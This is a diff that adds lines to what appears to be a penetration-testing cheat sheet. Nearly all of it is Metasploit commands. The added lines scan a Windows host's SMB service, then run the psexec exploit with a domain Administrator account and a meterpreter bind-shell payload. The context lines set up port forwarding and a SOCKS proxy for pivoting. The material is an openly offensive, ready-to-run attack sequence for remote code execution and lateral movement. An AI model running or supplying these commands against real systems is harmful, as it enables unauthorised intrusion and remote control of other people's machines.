@@ -40,6 +40,16 @@ portfwd add -R -p 8080 -l 80 -L ip
 
 #metasploit
 setg Proxies socks4:127.0.0.1:1080
+msf6 > use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.120.1
+msf6 auxiliary(scanner/smb/smb_version) > run
+msf6 > use exploit/windows/smb/psexec
+msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.120.1
+msf6 exploit(windows/smb/psexec) > set SMBDomain CYBER
+msf6 exploit(windows/smb/psexec) > set SMBUser Administrator
+msf6 exploit(windows/smb/psexec) > set SMBPass REDACTED
+msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/bind_tcp
+msf6 exploit(windows/smb/psexec) > exploit
 
 
 
